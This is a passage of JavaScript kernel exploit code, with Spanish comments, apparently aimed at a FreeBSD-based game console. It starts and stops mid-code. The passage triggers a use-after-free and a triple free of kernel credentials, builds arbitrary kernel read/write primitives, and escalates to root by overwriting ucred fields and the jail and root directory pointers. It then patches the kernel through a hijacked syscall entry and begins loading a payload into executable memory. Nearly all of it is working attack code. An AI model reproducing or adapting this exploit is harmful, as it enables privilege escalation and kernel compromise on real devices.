                    if (ipv6[i] === master || ipv6[i] === slave) continue;
                    if (burned.has(ipv6[i])) continue;
                    sprayDv.setUint32(4, tagFor(i), true); setRthdr(ipv6[i]);
                }
                const t = getRthdr(master, IP6_RTHDR0_SIZE, 8) < 0 ? { ok: false, idx: 0 } : readTag();
                const fd = (t.ok && t.idx < ipv6.length) ? ipv6[t.idx] : -1;
                if (fd !== -1 && fd !== master && fd !== slave && !burned.has(fd)) {
                    mark("TRIPLET-" + tag, "round=" + round + " fd=" + fd);
                    return fd;
                }
                if ((round + 1) % 100 === 0) sc(SYS.sched_yield);
            }
            mark("TRIPLET-" + tag + "-MISS", "rounds=" + rounds);
            return 0;
        }

        const nameAb = new ArrayBuffer(8), outAb = new ArrayBuffer(0x10);
        keepAlive.push(nameAb, outAb);
        const nameAddr = bufAddr(nameAb), outAddr = bufAddr(outAb);
        const nameDv = new DataView(nameAb);
        new Uint8Array(outAb).fill(0);
        nameDv.setUint32(0, 1, true); nameDv.setUint32(4, 21, true);
        lenDv.setUint32(0, 0x10, true); lenDv.setUint32(4, 0, true);
        sc(SYS.sysctl, nameAddr, 2, outAddr, lenAddr, 0, 0);
        check("console-rebooted-since", true, "(guard bypassed)");

        let twins = null, triplets = null;
        let uncontained = null;
        for (let attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
            if (uncontained) break;
            state("attempt " + attempt + "...", "warn");
            mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
            try {
                const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                if (dummy === -1) { mark("ATTEMPT-SKIP", "socket"); continue; }
                const reg = netevent(dummy, NETEVENT_SET_QUEUE);
                if (reg.rv === -1) { sc(SYS.close, dummy); continue; }
                sc(SYS.close, dummy);
                sc(SYS.setuid, 1);
                uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                if (uafSock !== dummy) { if (uafSock !== -1) sc(SYS.close, uafSock); uafSock = 0; continue; }
                sc(SYS.setuid, 1);
                netevent(uafSock, NETEVENT_CLEAR_QUEUE);
                mark("UAF-ARMED", "fd=" + uafSock);
                committed = true;
                for (let i = 0; i < 0x80; ++i) sc(SYS.sendmsg, 0, msgAddr, 0);
                if (STOP_BEFORE_DOUBLE) { mark("STOP", ""); rebootRequired = true; break; }
                const d1 = sc(SYS.dup, uafSock).i32;
                if (d1 === -1) { rebootRequired = true; continue; }
                nanosleepMs(MS_DELAY);
                sc(SYS.close, d1);
                rebootRequired = true;
                mark("DOUBLE-FREE", "dup=" + d1);
                twins = findTwins(MAX_ROUNDS_TWIN);
                if (!twins) { if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; } continue; }
                mark("TWINS", "a=" + twins.a + " b=" + twins.b);
                freeRthdr(twins.b);
                let reclaimed = false, rounds = 0;
                function fireTracked(w) {
                    const t = fireW(w, SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
                    t.settled = false;
                    t.then(() => { t.settled = true; }, () => { t.settled = true; });
                    return t;
                }
                const tasks = new Array(iovWorkers.length);
                for (let i = 0; i < NUM_IOV_SPRAY && !reclaimed; ++i) {
                    rounds = i + 1;
                    for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
                    sc(SYS.sched_yield);
                    await new Promise(r => setTimeout(r, 2));
                    if (getRthdr(twins.a, IP6_RTHDR0_SIZE, 8) >= 0 && leakDv.getInt32(0, true) === 1) { reclaimed = true; break; }
                    for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
                    try { await Promise.race([Promise.all(tasks), new Promise((_, rej) => setTimeout(() => rej(new Error("t")), 500))]); } catch (_) { }
                    for (let k = 0; k < iovWorkers.length; ++k) try { sc(SYS.read, iovSs[0], scratch, 1); } catch (e) { }
                    if ((i & 0x1f) === 0x1f) await new Promise(r => setTimeout(r, 0));
                }
                mark("IOV-RETS", "rounds=" + rounds);
                if (!reclaimed) {
                    for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
                    try { await Promise.race([Promise.all(tasks), new Promise((_, rej) => setTimeout(() => rej(new Error("t")), 500))]); } catch (_) { }
                    for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
                    burn(twins.a, "drive"); burn(twins.b, "drive");
                    twins = null;
                    if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                    continue;
                }
                const d2 = sc(SYS.dup, uafSock).i32;
                if (d2 === -1) break;
                sc(SYS.close, d2);
                mark("TRIPLE-FREE", "dup=" + d2);
                const t0 = twins.a;
                getRthdr(t0, IP6_RTHDR0_SIZE, 8);
                const t1 = findTriplet(t0, -1, "T1", MAX_ROUNDS_TRIPLET);
                for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
                try { await Promise.race([Promise.all(tasks), new Promise((_, rej) => setTimeout(() => rej(new Error("t")), 500))]); } catch (_) { }
                for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
                const t2 = findTriplet(t0, t1, "T2", MAX_ROUNDS_TRIPLET);
                if (t1 && t2) { triplets = [t0, t1, t2]; mark("TRIPLETS", triplets.join(",")); }
                else { burn(t0, "miss"); if (t1) burn(t1, "miss"); uncontained = "triplet-miss"; }
            } catch (attemptErr) {
                mark("ATTEMPT-THREW", attemptErr.message || String(attemptErr));
                twins = null;
                if (uafSock > 0) { try { sc(SYS.close, uafSock); } catch (_) { } uafSock = 0; }
                continue;
            }
        }
        check("ucred-triple-freed", !!triplets, triplets ? triplets.join(",") : "");
        if (!triplets) { state("Sin triple free", "bad"); return; }

        // ============================================================
        // UTILIDADES kread/kwrite
        // ============================================================
        function fakeUio(uioIov, resid, rw) {
            new Uint8Array(iovAb).fill(0);
            put(iovDv, 0x00, uioIov);
            iovDv.setUint32(0x08, NUM_UIO_IOV, true);
            put(iovDv, 0x10, -1);
            put(iovDv, 0x18, resid);
            iovDv.setUint32(0x20, UIO_SYSSPACE, true);
            iovDv.setUint32(0x24, rw, true);
            put(iovDv, 0x28, 0);
        }
        function restoreRefcntIov() { new Uint8Array(iovAb).fill(0); put(iovDv, 0, 1); put(iovDv, 8, 1); }
        function tripletsUsable() { return triplets && triplets.length === 3 && triplets.every(fd => fd > 0 && ipv6.indexOf(fd) >= 0); }
        async function landUio(size, forWrite, tasks) {
            if (!tripletsUsable()) return null;
            freeRthdr(triplets[2]);
            const wakeBytes = Math.min(size * NUM_UIO_IOV, 0x800);
            for (let i = 0; i < NUM_UIO_SPRAY; ++i) {
                for (let k = 0; k < uioWorkers.length; ++k) tasks[k] = fireW(uioWorkers[k], forWrite ? SYS.readv : SYS.writev, [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV], 0);
                sc(SYS.sched_yield);
                if (getRthdr(triplets[0], IOVEC_SIZE) >= 0 && leakDv.getInt32(8, true) === NUM_UIO_IOV)
                    return new int64(leakDv.getUint32(0, true), leakDv.getUint32(4, true));
                if (forWrite) { for (let k = 0; k < uioWorkers.length; ++k) sc(SYS.write, uioSs[1], scratch, wakeBytes); }
                else { for (let k = 0; k < uioWorkers.length; ++k) sc(SYS.read, uioSs[0], scratch, wakeBytes); }
                try { await Promise.all(tasks); } catch (_) { }
                if (!forWrite) sc(SYS.write, uioSs[1], scratch, wakeBytes);
                if ((i & 0x1f) === 0x1f) await new Promise(r => setTimeout(r, 0));
            }
            return null;
        }
        async function landFakeUio(tasks) {
            if (!tripletsUsable()) return false;
            freeRthdr(triplets[1]);
            for (let i = 0; i < NUM_IOV_SPRAY_MAX; ++i) {
                for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireW(iovWorkers[k], SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
                sc(SYS.sched_yield);
                if (getRthdr(triplets[0], UIO_SIZE + IOVEC_SIZE) >= 0 && leakDv.getUint32(0x20, true) === UIO_SYSSPACE) return true;
                for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
                try { await Promise.all(tasks); } catch (_) { }
                for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
            }
            return false;
        }
        async function releaseIov(itasks) {
            for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
            try { await Promise.race([Promise.all(itasks), new Promise((_, rej) => setTimeout(() => rej(new Error("t")), 500))]); } catch (_) { }
            for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
        }
        function tripletsAgree(why) {
            if (!tripletsUsable()) return false;
            const tags = [], refs = [];
            for (const fd of triplets) {
                if (getRthdr(fd, UCRED_SIZE, 8) < 0) return false;
                const v = leakDv.getUint32(4, true) >>> 0;
                if ((v & 0xffff0000) !== RTHDR_TAG) return false;
                tags.push(v);
                if (getRthdr(fd, UCRED_SIZE, 0x10) < 0) return false;
                const ref = leakDv.getUint32(0, true);
                if (ref === 0) return false;
                refs.push(ref);
            }
            return tags[0] === tags[1] && tags[1] === tags[2] && refs.every(r => r > 0);
        }
        function refindPair(tag) {
            for (let retry = 0; retry < 3; ++retry) {
                triplets[1] = findTriplet(triplets[0], -1, tag + "1", FIND_TRIPLET_FAST);
                triplets[2] = findTriplet(triplets[0], triplets[1], tag + "2", FIND_TRIPLET_FAST);
                if (tripletsUsable() && tripletsAgree(tag)) return true;
                sc(SYS.sched_yield);
            }
            return false;
        }
        async function refindTriplets(itasks) { await releaseIov(itasks); if (refindPair("RE")) return true; return false; }
        async function unwind(utasks, itasks, why, wakeUio, size, drainReads) {
            try { if (wakeUio && utasks && utasks[0]) { const dsz = size || 8; for (let k = 0; k < (drainReads || 0); ++k) sc(SYS.read, uioSs[0], scratch, dsz); await Promise.all(utasks); } } catch (e) { }
            try { if (itasks && itasks[0]) await releaseIov(itasks); } catch (e) { }
            restoreRefcntIov();
            return refindPair("UW");
        }
        const isKptr = v => !!v && (v.hi >>> 0) >= 0xffff0000;
        const kAligned = v => !!v && ((v.low >>> 0) & 7) === 0;
        function kaddrOk(v) { return isKptr(v) && kAligned(v); }
        const qw = (dv, o) => new int64(dv.getUint32(o, true), dv.getUint32(o + 4, true));

        async function kreadSlow(addr, size, pairs) {
            if (kreadPoisoned) return null;
            if (pairs) { for (const q of pairs) if (!kaddrOk(q.addr)) return null; }
            else if (!kaddrOk(addr)) return null;
            if (!tripletsUsable()) return null;
            mark("KREAD-BEGIN", "addr=" + (pairs ? pairs.map(p2 => "" + p2.addr).join("+") : addr) + " size=" + size);
            const bufs = uioWorkers.map(function () {
                const ab = new ArrayBuffer(size); keepAlive.push(ab);
                new Uint8Array(ab).fill(0x41);
                return { ab: ab, addr: bufAddr(ab), dv: new DataView(ab) };
            });
            sc(SYS.write, uioSs[1], scratch, Math.min(size * (uioWorkers.length + 4), 0x800));
            put(uioIovDv, 8, size);
            const utasks = new Array(uioWorkers.length);
            const uioIov = await landUio(size, false, utasks);
            if (!uioIov) { await unwind(utasks, null, "no-uio", true, size, 1); return null; }
            fakeUio(uioIov, size, UIO_WRITE);
            if (pairs) { for (let i = 0; i < pairs.length; ++i) { put(iovDv, 0x30 + IOVEC_SIZE * i, pairs[i].addr); put(iovDv, 0x38 + IOVEC_SIZE * i, pairs[i].size); } }
            else { put(iovDv, 0x30, addr); put(iovDv, 0x38, size); }
            const itasks = new Array(iovWorkers.length);
            const ok = await landFakeUio(itasks);
            if (!ok) { kreadPoisoned = true; await unwind(utasks, itasks, "no-fake-uio", false, size); return null; }
            sc(SYS.read, uioSs[0], scratch, Math.min(size * (uioWorkers.length + 4), 0x800));
            let got = null;
            for (const b of bufs) {
                sc(SYS.read, uioSs[0], b.addr, size);
                if (!got && !(b.dv.getUint32(0, true) === 0x41414141 && b.dv.getUint32(4, true) === 0x41414141)) got = b.dv;
            }
            await Promise.all(utasks);
            restoreRefcntIov();
            await refindTriplets(itasks);
            return got;
        }
        async function kwriteSlow(dst, srcAddr, size) {
            if (kreadPoisoned) return false;
            if (!kaddrOk(dst) || !tripletsUsable()) return false;
            mark("KWRITE-BEGIN", "dst=" + dst + " size=" + size);
            sc(SYS.write, uioSs[1], scratch, Math.min(size * (uioWorkers.length + 4), 0x800));
            put(uioIovDv, 8, size);
            const utasks = new Array(uioWorkers.length);
            const uioIov = await landUio(size, true, utasks);
            if (!uioIov) { await unwind(utasks, null, "no-uio", true, size, 0); return false; }
            fakeUio(uioIov, size, UIO_READ);
            put(iovDv, 0x30, dst); put(iovDv, 0x38, size);
            const itasks = new Array(iovWorkers.length);
            const ok = await landFakeUio(itasks);
            if (!ok) { kreadPoisoned = true; await unwind(utasks, itasks, "no-fake-uio", false, size); return false; }
            for (let k = 0; k < uioWorkers.length; ++k) sc(SYS.write, uioSs[1], srcAddr, size);
            await Promise.all(utasks);
            restoreRefcntIov();
            await refindTriplets(itasks);
            return true;
        }

        const KREAD_TRIES = 4;
        async function kread8(a) {
            for (let t = 0; t < KREAD_TRIES; ++t) { const dv = await kreadSlow(a, 8); if (dv) return new int64(dv.getUint32(0, true), dv.getUint32(4, true)); if (kreadPoisoned || !tripletsUsable()) break; }
            return null;
        }
        async function kwrite8n(dst, srcAddr, n) {
            for (let t = 0; t < KREAD_TRIES; ++t) { if (await kwriteSlow(dst, srcAddr, n)) return true; if (kreadPoisoned || !tripletsUsable()) break; }
            return false;
        }
        async function kreadN(a, n) {
            for (let t = 0; t < KREAD_TRIES; ++t) { const dv = await kreadSlow(a, n); if (dv) return dv; if (kreadPoisoned || !tripletsUsable()) break; }
            return null;
        }
        async function kreadPairs(pairs) {
            let total = 0; for (const p2 of pairs) total += p2.size;
            for (let t = 0; t < KREAD_TRIES; ++t) { const dv = await kreadSlow(null, total, pairs); if (dv) return dv; if (kreadPoisoned || !tripletsUsable()) break; }
            return null;
        }
        const kptr = v => v && (v.hi >>> 0) >= 0xffff0000;

        // ============================================================
        // LOOP DE make_karw CON REINTENTOS
        // ============================================================
        let kernelBase = null, kqFdp = null, kv = null, karwAttempt = 0;

        if (CFG_DO_MAKE_KARW === 1 && off.k_kl_lock && off.k_kl_lock !== 0) {
            for (karwAttempt = 1; karwAttempt <= CFG_KARW_MAX_ATTEMPTS && !kv; karwAttempt++) {
                state("make_karw " + karwAttempt + "/" + CFG_KARW_MAX_ATTEMPTS + "...", "warn");
                mark("KARW-ATTEMPT", karwAttempt + "/" + CFG_KARW_MAX_ATTEMPTS);
                if (kreadPoisoned || !tripletsUsable()) { mark("KARW-ABORT", "no triplets"); break; }

                freeRthdr(triplets[2]);
                sc(SYS.sched_yield); sc(SYS.sched_yield);
                let leaked = false;
                let kqFdLocal = -1;
                let kqLeakDump = null;
                const held = [];
                for (let i = 0; i < NUM_LEAK_KQUEUE; ++i) {
                    const kq = sc(SYS.kqueue).i32;
                    if (kq === -1) { while (held.length) sc(SYS.close, held.pop()); sc(SYS.sched_yield); continue; }
                    held.push(kq);
                    const got = getRthdr(triplets[0], KQUEUE_SIZE, 0xa0);
                    const fdpLo = leakDv.getUint32(0x98, true);
                    const fdpHi = leakDv.getUint32(0x9c, true);
                    const magicOk = got >= 0xa0 && leakDv.getUint32(8, true) === KQ_HDR_MAGIC && leakDv.getUint32(12, true) === 0;
                    if (magicOk && (fdpLo !== 0 || fdpHi !== 0)) {
                        kqFdLocal = held.pop();
                        leaked = true;
                        kqLeakDump = new Uint8Array(0xa0);
                        for (let j = 0; j < 0xa0; ++j) kqLeakDump[j] = leakU8[j];
                        break;
                    }
                    if (held.length >= KQ_BATCH) { while (held.length) sc(SYS.close, held.pop()); sc(SYS.sched_yield); }
                }
                while (held.length) sc(SYS.close, held.pop());

                if (!leaked || !kqLeakDump) {
                    mark("KARW-NO-KQUEUE", "intento=" + karwAttempt);
                    if (!refindPair("KA")) break;
                    continue;
                }

                const rd32 = (o) => kqLeakDump[o] | (kqLeakDump[o+1] << 8) | (kqLeakDump[o+2] << 16) | (kqLeakDump[o+3] << 24);
                const rd64 = (o) => new int64(rd32(o) >>> 0, rd32(o+4) >>> 0);
                const klLock = rd64(0x60);
                const kqFdp0 = rd64(0x98);
                const localKbase = klLock.sub32(off.k_kl_lock);

                mark("KARW-KQ", "intento=" + karwAttempt + " kq_fd=" + kqFdLocal
                    + " kl_lock=" + klLock + " kq_fdp=" + kqFdp0 + " kbase=" + localKbase);

                const candidates = [];
                for (const probeOff of [0x80, 0x88, 0x90, 0x98, 0xa0, 0xa8, 0xb0]) {
                    const cand = rd64(probeOff);
                    if (cand.hi >= 0xffff0000 && (cand.low & 7) === 0) candidates.push({ off: probeOff, ptr: cand });
                }
                mark("KARW-CANDIDATES", candidates.length + " candidatos");

                // *** FIX v12: refindear triplets ANTES de probar (spray los movió) ***
                triplets[2] = findTriplet(triplets[0], triplets[1], "KQ", MAX_ROUNDS_TRIPLET);
                if (!triplets[2]) {
                    mark("KARW-TRIPLET-LOST", "intento=" + karwAttempt);
                    sc(SYS.close, kqFdLocal);
                    break;
                }

                let fdtOfiles = null, fdtOff = -1, consecutiveFails = 0;
                for (const cand of candidates) {
                    if (kreadPoisoned || !tripletsUsable()) break;
                    if (consecutiveFails >= 2) { mark("KARW-BAILOUT", "2 fails"); break; }
                    mark("KARW-TRY", "off=0x" + cand.off.toString(16) + " ptr=" + cand.ptr);
                    const v = await kread8(cand.ptr);
                    if (v && kaddrOk(v)) { fdtOfiles = v; fdtOff = cand.off; mark("KARW-FDT-FOUND", "off=0x" + cand.off.toString(16) + " -> " + v); break; }
                    consecutiveFails++;
                    mark("KARW-FDT-ZERO", "off=0x" + cand.off.toString(16) + " val=" + v);
                }

                // *** FIX v12: cerrar el kqueue DESPUÉS de probar candidatos ***
                sc(SYS.close, kqFdLocal);

                // *** Y refindear triplets después del close ***
                if (!refindPair("KC")) {
                    mark("KARW-TRIPLETS-LOST-AFTER-CLOSE", "intento=" + karwAttempt);
                    break;
                }

                if (!fdtOfiles) {
                    mark("KARW-FDT-FAILED", "intento=" + karwAttempt);
                    if (!tripletsUsable() || !refindPair("KF")) break;
                    continue;
                }

                mark("KARW-OK", "intento=" + karwAttempt + " fdt=" + fdtOfiles + " via 0x" + fdtOff.toString(16));
                kernelBase = localKbase;
                kqFdp = kqFdp0;

                let mFp = null, sFp = null;
                const fdDelta = slavePipe[0] - masterPipe[0];
                if (fdDelta > 0 && (fdDelta + 1) * FILEDESCENT_SIZE <= 0x20) {
                    const span = await kreadN(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE), 0x20);
                    if (span) { mFp = qw(span, 0); sFp = qw(span, fdDelta * FILEDESCENT_SIZE); }
                }
                if (!mFp && !kreadPoisoned && tripletsUsable()) {
                    mFp = await kread8(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
                    sFp = await kread8(fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
                }
                mark("KARW-PIPE-FP", "m=" + (mFp || "?") + " s=" + (sFp || "?"));

                let mData = null, sData = null;
                if (mFp && sFp) {
                    const both = await kreadPairs([{ addr: mFp, size: 8 }, { addr: sFp, size: 8 }]);
                    if (both) { mData = qw(both, 0); sData = qw(both, 8); }
                }
                if (!mData && !kreadPoisoned && tripletsUsable()) {
                    mData = mFp ? await kread8(mFp) : null;
                    sData = sFp ? await kread8(sFp) : null;
                }
                mark("KARW-PIPE-FDATA", "m=" + (mData || "?") + " s=" + (sData || "?"));

                if (!check("ofiles-reached-pipes", kptr(fdtOfiles) && kptr(mFp) && kptr(sFp) && kptr(mData) && kptr(sData), "")) {
                    if (!tripletsUsable() || !refindPair("KP")) break;
                    continue;
                }

                const pbAb = new ArrayBuffer(PIPEBUF_SIZEOF); keepAlive.push(pbAb);
                const pbAddr = bufAddr(pbAb), pbDv = new DataView(pbAb);
                new Uint8Array(pbAb).fill(0);
                pbDv.setUint32(0x0c, PIPE_PAGE, true);
                put(pbDv, 0x10, sData);
                mark("KARW-PIPEBUF-AIM", "at=" + mData + " buf=" + sData);
                const wrote = await kwrite8n(mData, pbAddr, PIPEBUF_SIZEOF);
                if (!check("pipebuf-written", wrote, "")) {
                    if (!tripletsUsable() || !refindPair("KW")) break;
                    continue;
                }

                for (const fd of [masterPipe[0], masterPipe[1], slavePipe[0], slavePipe[1]]) sc(SYS.fcntl, fd, F_SETFL, O_NONBLOCK);
                const kvBufAb = new ArrayBuffer(PIPEBUF_SIZEOF);
                const kvViewAb = new ArrayBuffer(0x40);
                keepAlive.push(kvBufAb, kvViewAb);
                const kvBufAddr = bufAddr(kvBufAb), kvBufDv = new DataView(kvBufAb);
                const kvViewAddr = bufAddr(kvViewAb), kvViewDv = new DataView(kvViewAb);
                new Uint8Array(kvBufAb).fill(0); kvBufDv.setUint32(0x0c, PIPE_PAGE, true);
                kv = {
                    flush: function () {
                        sc(SYS.write, masterPipe[1], kvBufAddr, PIPEBUF_SIZEOF);
                        sc(SYS.read, masterPipe[0], kvBufAddr, PIPEBUF_SIZEOF);
                    },
                    kread: function (dst, src, n) {
                        put(kvBufDv, 0x10, src); kvBufDv.setUint32(0, n >>> 0, true);
                        this.flush();
                        return sc(SYS.read, slavePipe[0], dst, n).i32;
                    },
                    kwrite: function (dst, src, n) {
                        put(kvBufDv, 0x10, dst); kvBufDv.setUint32(0, n >>> 0, true);
                        this.flush();
                        return sc(SYS.write, slavePipe[1], src, n).i32;
                    },
                    read8: function (a) {
                        new Uint8Array(kvViewAb).fill(0);
                        this.kread(kvViewAddr, a, 8);
                        return new int64(kvViewDv.getUint32(0, true), kvViewDv.getUint32(4, true));
                    },
                };

                new Uint8Array(kvViewAb).fill(0);
                kv.kread(kvViewAddr, kernelBase, 0x10);
                const elfOk = kvViewDv.getUint32(0, true) === 0x464c457f;
                if (!check("kernelview-elf-header", elfOk, "")) {
                    kv = null;
                    if (!tripletsUsable() || !refindPair("KV")) break;
                    continue;
                }
                mark("KARW-SUCCESS", "intento=" + karwAttempt);
                break;
            }
        }

        if (!kv) {
            mark("MAKE-KARW-ABORTED", "todos los intentos fallaron");
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            state("make_karw falló", "bad");
            return;
        }

        // ============================================================
        // JAILBREAK + KPATCH + PAYLOAD (usando kv)
        // ============================================================
        const kvwAb = new ArrayBuffer(0x10); keepAlive.push(kvwAb);
        const kvwAddr = bufAddr(kvwAb), kvwDv = new DataView(kvwAb);
        function kview(base) {
            return {
                getBInt: o => kv.read8(base.add32(o)),
                setBInt: function (o, v) { new Uint8Array(kvwAb).fill(0); put(kvwDv, 0, v); kv.kwrite(base.add32(o), kvwAddr, 8); },
                getInt32: function (o) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, base.add32(o), 4); return kvwDv.getInt32(0, true); },
                setInt32: function (o, v) { new Uint8Array(kvwAb).fill(0); kvwDv.setInt32(0, v, true); kv.kwrite(base.add32(o), kvwAddr, 4); },
                setUint8: function (o, v) { new Uint8Array(kvwAb).fill(0); kvwDv.setUint8(0, v); kv.kwrite(base.add32(o), kvwAddr, 1); },
            };
        }
        const fdtOfiles = await kread8(kqFdp);

        // Jailbreak
        let jailbroken = false, curproc = null;
        if (CFG_DO_JAILBREAK === 1) try {
            const FIOSETOWN = 0x8004667c;
            const P_LIST_NEXT = 0x00, P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
            const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c;
            const CR_NGROUPS = 0x10, CR_RGID = 0x14;
            const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
            const FD_RDIR = 0x10, FD_JDIR = 0x18;
            state("jailbreak...", "warn");
            const fget = fd => kv.read8(fdtOfiles.add32(fd * FILEDESCENT_SIZE));
            const kptr2 = v => v && (v.hi >>> 0) >= 0xffff0000;
            if (sc(SYS.pipe, argAddr).i32 !== -1) {
                const escPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
                lenDv.setUint32(0, pid, true);
                sc(SYS.ioctl, escPipe[0], FIOSETOWN, lenAddr);
                const escFp = fget(escPipe[0]);
                const escData = kptr2(escFp) ? kv.read8(escFp) : null;
                const sigio = kptr2(escData) ? kv.read8(escData.add32(0xd0)) : null;
                curproc = kptr2(sigio) ? kv.read8(sigio) : null;
                sc(SYS.close, escPipe[1]); sc(SYS.close, escPipe[0]);
            }
            check("curproc-via-sigio", kptr2(curproc), "" + (curproc || "null"));
            if (kptr2(curproc)) {
                function pfind(target) {
                    let q = kv.read8(curproc);
                    for (let n = 0; n < 4096; ++n) { if (!kptr2(q)) return null; if (kview(q).getInt32(P_PID) === target) return q; q = kv.read8(q.add32(P_LIST_NEXT)); }
                    return null;
                }
                const kProc = pfind(0);
                const procFd = kv.read8(curproc.add32(P_FD));
                const ucred = kv.read8(curproc.add32(P_UCRED));
                const prison0 = kptr2(kProc) ? kv.read8(kv.read8(kProc.add32(P_UCRED)).add32(CR_PRISON)) : null;
                const rootVnode = kptr2(kProc) ? kv.read8(kv.read8(kProc.add32(P_FD)).add32(FD_RDIR)) : null;
                const srcOk = kptr2(procFd) && kptr2(ucred) && kptr2(prison0) && kptr2(rootVnode);
                if (check("jailbreak-kernel-pointers", srcOk, "")) {
                    kview(ucred).setInt32(CR_UID, 0);
                    kview(ucred).setInt32(CR_RUID, 0);
                    kview(ucred).setInt32(CR_SVUID, 0);
                    kview(ucred).setInt32(CR_NGROUPS, 1);
                    kview(ucred).setInt32(CR_RGID, 0);
                    kview(ucred).setBInt(CR_PRISON, prison0);
                    kview(ucred).setBInt(CR_SCECAPS1, new int64(-1, -1));
                    kview(ucred).setBInt(CR_SCECAPS0, new int64(-1, -1));
                    kview(procFd).setBInt(FD_RDIR, rootVnode);
                    kview(procFd).setBInt(FD_JDIR, rootVnode);
                    const uidNow = sc(SYS.getuid).i32;
                    jailbroken = uidNow === 0;
                    mark("JAILBROKEN", "uid=" + uidNow);
                    check("kernel-reports-root", jailbroken, "getuid=" + uidNow);
                }
            }
        } catch (jbe) { mark("JAILBREAK-THREW", jbe.message || String(jbe)); }

        // Kpatch
        let kpatched = false;
        if (CFG_DO_KPATCH === 1 && jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) try {
            state("kpatch...", "warn");
            const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
            const sysent = kernelBase.add32(off.k_sysent_661);
            const gadget = kernelBase.add32(off.k_jmp_rsi);
            const gb = [];
            for (let i = 0; i < 4; ++i) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, gadget.add32(i), 1); gb.push(kvwDv.getUint8(0)); }
            const gadgetOk = gb[0] === 0xff && gb[1] === 0x26;
            const oNarg = kview(sysent).getInt32(SYSENT_NARG);
            const oCall = kview(sysent).getBInt(SYSENT_CALL);
            const oThr = kview(sysent).getInt32(SYSENT_THRCNT);
            const sysentOk = oNarg >= 0 && oNarg <= 8 && kptr(oCall);
            let sitesOk = true;
            for (const s of KPATCH_JMP_SITES) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, kernelBase.add32(s), 1); const b = kvwDv.getUint8(0); if (!((b >= 0x70 && b <= 0x7f) || b === 0xeb)) sitesOk = false; }
            check("kpatch-gates", gadgetOk && sysentOk && sitesOk, "g=" + gadgetOk + " s=" + sysentOk + " sites=" + sitesOk);
            if (gadgetOk && sysentOk && sitesOk) {
                const jitFd = sc(SYS.jitshm_create, 0, 0x4000, 7).i32;
                const KEXEC_MAP = new int64(0x20100000, 9);
                const mapped = sc(SYS.mmap, KEXEC_MAP, 0x4000, 7, 0x11, jitFd, 0);
                const mapAddr = new int64(mapped.lo, mapped.hi);
                if (mapAddr.hi > 0) {
                    for (let i = 0; i < kpatch.length; ++i) p.write1(mapAddr.add32(i), kpatch[i]);
                    let copied = true;
                    for (let i = 0; i < kpatch.length; ++i) if (p.read1(mapAddr.add32(i)) !== kpatch[i]) { copied = false; break; }
                    check("blob-copied", copied, kpatch.length + " bytes");
                    if (copied) {
                        kview(sysent).setInt32(SYSENT_NARG, 2);
                        kview(sysent).setBInt(SYSENT_CALL, gadget);
                        kview(sysent).setInt32(SYSENT_THRCNT, 1);
                        let rc = -1;
                        try { rc = sc(SYS.kexec, mapAddr).i32; }
                        finally {
                            kview(sysent).setInt32(SYSENT_NARG, oNarg);
                            kview(sysent).setBInt(SYSENT_CALL, oCall);
                            kview(sysent).setInt32(SYSENT_THRCNT, oThr);
                        }
                        let allEb = true;
                        for (const s of KPATCH_JMP_SITES) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, kernelBase.add32(s), 1); if (kvwDv.getUint8(0) !== 0xeb) allEb = false; }
                        kpatched = rc === 0 && allEb;
                        check("kpatch-sites-0xeb", allEb, "");
                        check("kpatch-kexec-0", rc === 0, "rc=" + rc);
                    }
                }
            }
        } catch (kpe) { mark("KPATCH-THREW", kpe.message || String(kpe)); }

        // Payload
        let payloadRunning = false, aiofixRan = false;
        if (CFG_DO_PAYLOAD === 1 && (kpatched || params.get("payload") === "1") && params.get("payload") !== "0") {
            if (aiofix && aiofix.length > 0) {
                state("aiofix...", "warn");
                const asz = (aiofix.length + 0x3fff) & ~0x3fff;
                const am = sc(SYS.mmap, 0, asz, 7, 0x1002, -1, 0);
                const aEntry = new int64(am.lo, am.hi);
                mark("AIOFIX-MAP", "rwx=" + aEntry);
                if (aEntry.hi > 0) {
                    for (let i = 0; i < aiofix.length; ++i) p.write1(aEntry.add32(i), aiofix[i]);
                    let aBad = -1;
                    for (let i = 0; i < aiofix.length; ++i) if (p.read1(aEntry.add32(i)) !== aiofix[i]) { aBad = i; break; }
